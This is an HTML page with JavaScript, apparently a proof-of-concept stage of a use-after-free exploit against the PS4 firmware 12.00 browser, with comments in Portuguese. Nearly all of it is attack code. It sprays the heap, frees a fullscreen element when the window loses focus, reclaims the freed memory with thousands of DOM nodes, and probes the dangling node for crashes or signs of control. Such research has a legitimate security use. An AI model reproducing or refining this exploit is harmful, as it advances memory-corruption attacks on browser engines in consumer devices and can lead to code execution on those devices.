<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Exploit Stage</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Exploit Stage (Refined)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];
function log(msg) {
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP (INALTERADO)
// ==========================
function setupHeap() {
    let controllers = [];
    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }
    return controllers;
}

// ==========================
// FULLSCREEN (INALTERADO)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// 💣 RECLAIM FINO
// ==========================
function preciseReclaim(size) {
    log("[*] Reclaim size = " + size);

    let bucket = [];

    for (let i = 0; i < 3000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    for (let i = 0; i < size; i++) {
        let el = document.createElement("div");

        el.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>CONTROL_" + i + "<br>Press OPTIONS</h1>";

        el.style.background = "black";
        el.style.width = "100%";
        el.style.height = "100%";
        el.style.position = "absolute";
        el.style.top = "0";
        el.style.left = "0";

        document.body.appendChild(el);
        bucket.push(el);
    }

    for (let i = 0; i < 2000; i++) {
        let el = document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    return bucket;
}

// ==========================
// 🔬 PROBES AVANÇADOS
// ==========================
function probe(fsTarget) {
    log("---- PROBE ----");

    // innerHTML
    try {
        let html = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + html);

        if (html && html.includes("CONTROL_")) {
            log("[!!!] OWNED: CONTROL DETECTADO");
        }

    } catch(e) {
        log("[UAF] innerHTML crash");
    }

    // outerHTML
    try {
        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
    } catch(e) {
        log("[UAF] outerHTML crash");
    }

    // children
    try {
        log("[CHECK] children len = " + fsTarget.children.length);
    } catch(e) {
        log("[UAF] children crash");
    }

    // clone
    try {
        let clone = fsTarget.cloneNode(true);
        log("[CHECK] clone OK");
    } catch(e) {
        log("[UAF] clone crash");
    }

    // write
    try {
        fsTarget.innerHTML = "<div id='pwn'>AAAA</div>";
        log("[CHECK] write innerHTML OK");
    } catch(e) {
        log("[UAF] write innerHTML crash");
    }

    // layout
    try {
        let h = fsTarget.offsetHeight;
        log("[CHECK] layout = " + h);
    } catch(e) {
        log("[UAF] layout crash");
    }

    // rect
    try {
        fsTarget.getBoundingClientRect();
        log("[CHECK] rect OK");
    } catch(e) {
        log("[UAF] rect crash");
    }

    // parent
    try {
        log("[CHECK] parent = " + fsTarget.parentNode);
    } catch(e) {
        log("[UAF] parent crash");
    }

    // isConnected
    try {
        log("[CHECK] isConnected = " + fsTarget.isConnected);
    } catch(e) {
        log("[UAF] isConnected crash");
    }

    // nodeType
    try {
        log("[CHECK] nodeType = " + fsTarget.nodeType);
    } catch(e) {
        log("[UAF] nodeType crash");
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

    } catch(e) {
        log("[ERRO]");
    }

    // 🎯 ajuste fino
    let sizes = [1500, 2000, 2500, 3000];

    sizes.forEach((size, idx) => {
        setTimeout(() => preciseReclaim(size), idx * 50);
    });

    // probes repetidos
    setTimeout(() => probe(fsTarget), 10);
    setTimeout(() => probe(fsTarget), 50);
    setTimeout(() => probe(fsTarget), 100);
    setTimeout(() => probe(fsTarget), 180);
    setTimeout(() => probe(fsTarget), 260);

    // dump seguro
    setTimeout(() => {
        alert(logBuffer.join("\n"));
    }, 400);

    setTimeout(() => location.reload(), 500);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur");
        setTimeout(() => trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
